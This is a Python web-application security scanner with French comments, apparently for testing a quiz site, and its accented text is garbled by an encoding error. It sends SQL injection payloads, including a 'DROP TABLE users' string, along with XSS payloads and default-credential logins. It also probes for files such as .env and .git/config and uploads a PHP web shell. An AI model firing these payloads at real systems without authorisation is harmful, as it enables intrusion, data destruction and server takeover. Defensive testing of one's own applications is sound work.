
*



#!/usr/bi

n/env python3
"""
Script de test de s√©curit√© pour application de quiz
Tests automatis√©s des principales vuln√©rabilit√©s
"""

import requests
import json
import time
import random
import string
from urllib.parse import urljoin, urlparse
import re
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class QuizSecurityTester:
    def __init__(self, base_url, session=None):
        self.base_url = base_url.rstrip('/')
        self.session = session or requests.Session()
        self.session.verify = False  # Pour les tests uniquement
        self.results = []
        
    def log_result(self, test_name, status, details=""):
        """Enregistre le r√©sultat d'un test"""
        result = {
            'test': test_name,
            'status': status,
            'details': details,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        self.results.append(result)
        print(f"[{status}] {test_name}: {details}")
        
    def test_https_redirect(self):
        """Test si HTTP redirige vers HTTPS"""
        try:
            if self.base_url.startswith('https://'):
                http_url = self.base_url.replace('https://', 'http://')
                resp = requests.get(http_url, allow_redirects=False, timeout=10, verify=False)
                if resp.status_code in [301, 302, 308] and 'https://' in resp.headers.get('Location', ''):
                    self.log_result("HTTPS Redirect", "PASS", "HTTP redirige correctement vers HTTPS")
                else:
                    self.log_result("HTTPS Redirect", "FAIL", f"Code: {resp.status_code}, Location: {resp.headers.get('Location', 'None')}")
            else:
                self.log_result("HTTPS Redirect", "SKIP", "URL de base n'utilise pas HTTPS")
        except Exception as e:
            self.log_result("HTTPS Redirect", "ERROR", str(e))
            
    def test_security_headers(self):
        """Test la pr√©sence des headers de s√©curit√©"""
        try:
            resp = self.session.get(self.base_url)
            headers = resp.headers
            
            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': 'max-age',
                'Content-Security-Policy': None,
                'Referrer-Policy': None
            }
            
            for header, expected in security_headers.items():
                if header in headers:
                    if isinstance(expected, list):
                        if any(exp in headers[header] for exp in expected):
                            self.log_result(f"Header {header}", "PASS", f"Valeur: {headers[header]}")
                        else:
                            self.log_result(f"Header {header}", "WARN", f"Valeur inattendue: {headers[header]}")
                    elif expected and expected not in headers[header]:
                        self.log_result(f"Header {header}", "WARN", f"Valeur: {headers[header]}")
                    else:
                        self.log_result(f"Header {header}", "PASS", f"Pr√©sent: {headers[header]}")
                else:
                    self.log_result(f"Header {header}", "FAIL", "Header manquant")
                    
        except Exception as e:
            self.log_result("Security Headers", "ERROR", str(e))
            
    def test_sql_injection(self, endpoints):
        """Test d'injection SQL sur diff√©rents endpoints"""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT null, username, password FROM users --",
            "admin'--",
            "' OR 1=1 --",
            "'; WAITFOR DELAY '00:00:05' --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --"
        ]
        
        for endpoint in endpoints:
            for payload in sql_payloads:
                try:
                    # Test en param√®tre GET
                    resp = self.session.get(f"{self.base_url}{endpoint}", 
                                          params={'id': payload, 'search': payload})
                    
                    # Recherche d'indices d'injection SQL
                    if any(error in resp.text.lower() for error in 
                          ['sql syntax', 'mysql_fetch', 'ora-', 'postgresql', 'sqlite']):
                        self.log_result(f"SQL Injection {endpoint}", "FAIL", 
                                      f"Erreur SQL d√©tect√©e avec payload: {payload}")
                        break
                    elif resp.elapsed.total_seconds() > 5:
                        self.log_result(f"SQL Injection {endpoint}", "FAIL", 
                                      f"D√©lai suspect avec payload: {payload}")
                        break
                        
                except Exception as e:
                    continue
            else:
                self.log_result(f"SQL Injection {endpoint}", "PASS", "Aucune injection d√©tect√©e")
                
    def test_xss_vulnerabilities(self, endpoints):
        """Test des vuln√©rabilit√©s XSS"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>"
        ]
        
        for endpoint in endpoints:
            for payload in xss_payloads:
                try:
                    # Test XSS reflected
                    resp = self.session.get(f"{self.base_url}{endpoint}", 
                                          params={'q': payload, 'search': payload})
                    
                    if payload in resp.text and 'text/html' in resp.headers.get('content-type', ''):
                        self.log_result(f"XSS {endpoint}", "FAIL", 
                                      f"XSS reflected d√©tect√©: {payload}")
                        break
                        
                    # Test XSS stored via POST
                    data = {'comment': payload, 'answer': payload, 'question': payload}
                    resp = self.session.post(f"{self.base_url}{endpoint}", data=data)
                    
                except Exception as e:
                    continue
            else:
                self.log_result(f"XSS {endpoint}", "PASS", "Aucune vuln√©rabilit√© XSS d√©tect√©e")
                
    def test_csrf_protection(self, endpoints):
        """Test de protection CSRF"""
        for endpoint in endpoints:
            try:
                # Tentative de requ√™te POST sans token CSRF
                data = {'action': 'delete', 'id': '1', 'vote': 'yes'}
                resp = self.session.post(f"{self.base_url}{endpoint}", data=data)
                
                # V√©rifier si l'action a √©t√© accept√©e sans token CSRF
                if resp.status_code == 200 and 'success' in resp.text.lower():
                    self.log_result(f"CSRF Protection {endpoint}", "FAIL", 
                                  "Action accept√©e sans token CSRF")
                elif 'csrf' in resp.text.lower() or resp.status_code == 403:
                    self.log_result(f"CSRF Protection {endpoint}", "PASS", 
                                  "Protection CSRF d√©tect√©e")
                else:
                    self.log_result(f"CSRF Protection {endpoint}", "WARN", 
                                  f"R√©ponse ambigu√´: {resp.status_code}")
                    
            except Exception as e:
                self.log_result(f"CSRF Protection {endpoint}", "ERROR", str(e))
                
    def test_rate_limiting(self, endpoint="/api/login"):
        """Test du rate limiting"""
        try:
            # Envoi rapide de multiples requ√™tes
            responses = []
            start_time = time.time()
            
            for i in range(20):
                resp = self.session.post(f"{self.base_url}{endpoint}", 
                                       data={'username': f'test{i}', 'password': 'password'})
                responses.append(resp.status_code)
                
            end_time = time.time()
            
            # Analyser les r√©ponses
            rate_limited = sum(1 for code in responses if code == 429)
            
            if rate_limited > 5:
                self.log_result("Rate Limiting", "PASS", 
                              f"{rate_limited}/20 requ√™tes bloqu√©es")
            else:
                self.log_result("Rate Limiting", "FAIL", 
                              f"Seulement {rate_limited}/20 requ√™tes bloqu√©es")
                              
        except Exception as e:
            self.log_result("Rate Limiting", "ERROR", str(e))
            
    def test_authentication_bypass(self, login_endpoint="/api/login"):
        """Test de contournement d'authentification"""
        bypass_payloads = [
            {'username': 'admin', 'password': 'admin'},
            {'username': 'administrator', 'password': 'password'},
            {'username': 'admin', 'password': '123456'},
            {'username': 'root', 'password': 'root'},
            {'username': 'test', 'password': 'test'},
            {'username': "admin' --", 'password': 'anything'},
            {'username': 'admin', 'password': "' OR '1'='1"}
        ]
        
        for payload in bypass_payloads:
            try:
                resp = self.session.post(f"{self.base_url}{login_endpoint}", data=payload)
                
                # Chercher des signes de connexion r√©ussie
                success_indicators = ['welcome', 'dashboard', 'token', 'success', 'logged']
                if any(indicator in resp.text.lower() for indicator in success_indicators):
                    self.log_result("Auth Bypass", "FAIL", 
                                  f"Contournement possible avec: {payload}")
                    return
                    
            except Exception as e:
                continue
                
        self.log_result("Auth Bypass", "PASS", "Aucun contournement d'authentification d√©tect√©")
        
    def test_information_disclosure(self):
        """Test de divulgation d'informations"""
        sensitive_paths = [
            '/.env',
            '/config.php',
            '/wp-config.php',
            '/database.yml',
            '/app.config',
            '/.git/config',
            '/backup.sql',
            '/phpinfo.php',
            '/server-status',
            '/debug',
            '/api/debug'
        ]
        
        for path in sensitive_paths:
            try:
                resp = self.session.get(f"{self.base_url}{path}")
                
                if resp.status_code == 200:
                    sensitive_content = ['password', 'secret', 'key', 'token', 'database']
                    if any(content in resp.text.lower() for content in sensitive_content):
                        self.log_result(f"Info Disclosure {path}", "FAIL", 
                                      f"Fichier sensible accessible")
                    else:
                        self.log_result(f"Info Disclosure {path}", "WARN", 
                                      f"Fichier accessible mais contenu √† v√©rifier")
                        
            except Exception as e:
                continue
                
    def test_quiz_manipulation(self, quiz_endpoints):
        """Test sp√©cifique √† la manipulation de quiz"""
        manipulation_tests = [
            # Tentative de modification des r√©ponses
            {'answer_id': '999', 'correct': 'true'},
            {'score': '100', 'time': '1'},
            {'question_id': '-1', 'answer': 'hack'},
            # Tentative d'acc√®s aux bonnes r√©ponses
            {'action': 'get_answers', 'quiz_id': '1'},
            {'debug': 'true', 'show_answers': 'yes'}
        ]
        
        for endpoint in quiz_endpoints:
            for test_data in manipulation_tests:
                try:
                    resp = self.session.post(f"{self.base_url}{endpoint}", data=test_data)
                    
                    # Recherche de donn√©es sensibles dans la r√©ponse
                    if any(word in resp.text.lower() for word in 
                          ['correct_answer', 'solution', 'answer_key', '"correct":true']):
                        self.log_result(f"Quiz Manipulation {endpoint}", "FAIL", 
                                      f"Donn√©es sensibles expos√©es: {test_data}")
                        break
                        
                except Exception as e:
                    continue
            else:
                self.log_result(f"Quiz Manipulation {endpoint}", "PASS", 
                              "Aucune manipulation d√©tect√©e")
                
    def test_file_upload_vulnerabilities(self, upload_endpoints):
        """Test des vuln√©rabilit√©s d'upload de fichiers"""
        malicious_files = {
            'shell.php': b'<?php system($_GET["cmd"]); ?>',
            'script.js': b'<script>alert("XSS")</script>',
            'large_file.txt': b'A' * (10 * 1024 * 1024),  # 10MB
            'evil.svg': b'<svg onload="alert(1)"><rect width="100" height="100"/></svg>'
        }
        
        for endpoint in upload_endpoints:
            for filename, content in malicious_files.items():
                try:
                    files = {'file': (filename, content)}
                    resp = self.session.post(f"{self.base_url}{endpoint}", files=files)
                    
                    if resp.status_code == 200 and 'success' in resp.text.lower():
                        self.log_result(f"File Upload {endpoint}", "FAIL", 
                                      f"Fichier malveillant accept√©: {filename}")
                    else:
                        self.log_result(f"File Upload {endpoint}", "PASS", 
                                      f"Fichier rejet√©: {filename}")
                        
                except Exception as e:
                    continue
                    
    def generate_report(self):
        """G√©n√®re un rapport de s√©curit√©"""
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'target': self.base_url,
            'total_tests': len(self.results),
            'passed': len([r for r in self.results if r['status'] == 'PASS']),
            'failed': len([r for r in self.results if r['status'] == 'FAIL']),
            'warnings': len([r for r in self.results if r['status'] == 'WARN']),
            'errors': len([r for r in self.results if r['status'] == 'ERROR']),
            'results': self.results
        }
        
        return report
        
    def run_all_tests(self):
        """Ex√©cute tous les tests de s√©curit√©"""
        print(f"üîç D√©but des tests de s√©curit√© pour: {self.base_url}")
        print("=" * 60)
        
        # Tests g√©n√©raux
        self.test_https_redirect()
        self.test_security_headers()
        self.test_information_disclosure()
        
        # Endpoints communes √† tester
        common_endpoints = ['/api/quiz', '/quiz', '/api/questions', '/login', '/register']
        quiz_endpoints = ['/api/submit', '/api/quiz', '/quiz/submit']
        upload_endpoints = ['/upload', '/api/upload', '/quiz/upload']
        
        # Tests sp√©cifiques
        self.test_sql_injection(common_endpoints)
        self.test_xss_vulnerabilities(common_endpoints)
        self.test_csrf_protection(common_endpoints)
        self.test_rate_limiting()
        self.test_authentication_bypass()
        self.test_quiz_manipulation(quiz_endpoints)
        self.test_file_upload_vulnerabilities(upload_endpoints)
        
        print("\n" + "=" * 60)
        print("üìä G√©n√©ration du rapport...")
        
        return self.generate_report()

def main():
    """Fonction principale"""
    print("üõ°Ô∏è  Script de Test de S√©curit√© - Application Quiz")
    print("‚ö†Ô∏è  ATTENTION: Utilisez uniquement sur vos propres applications!")
    print()
    
    target_url = input("Entrez l'URL de l'application √† tester: ").strip()
    
    if not target_url:
        print("‚ùå URL requise")
        return
        
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
        
    # Initialisation du testeur
    tester = QuizSecurityTester(target_url)
    
    # Ex√©cution des tests
    try:
        report = tester.run_all_tests()
        
        # Affichage du r√©sum√©
        print(f"\nüìà R√âSUM√â DES TESTS:")
        print(f"‚úÖ Tests r√©ussis: {report['passed']}")
        print(f"‚ùå Tests √©chou√©s: {report['failed']}")
        print(f"‚ö†Ô∏è  Avertissements: {report['warnings']}")
        print(f"üî¥ Erreurs: {report['errors']}")
        
        # Sauvegarde du rapport
        report_filename = f"security_report_{int(time.time())}.json"
        with open(report_filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
            
        print(f"\nüíæ Rapport d√©taill√© sauvegard√©: {report_filename}")
        
        # Recommandations
        if report['failed'] > 0:
            print("\nüö® VULNERABILIT√âS CRITIQUES D√âTECT√âES!")
            print("Corrigez imm√©diatement les probl√®mes identifi√©s.")
        elif report['warnings'] > 0:
            print("\n‚ö†Ô∏è  Des am√©liorations de s√©curit√© sont recommand√©es.")
        else:
            print("\nüéâ Aucune vuln√©rabilit√© majeure d√©tect√©e!")
            
    except KeyboardInterrupt:
        print("\n‚èπÔ∏è  Tests interrompus par l'utilisateur")
    except Exception as e:
        print(f"\n‚ùå Erreur lors des tests: {e}")

if __name__ == "__main__":
    main()

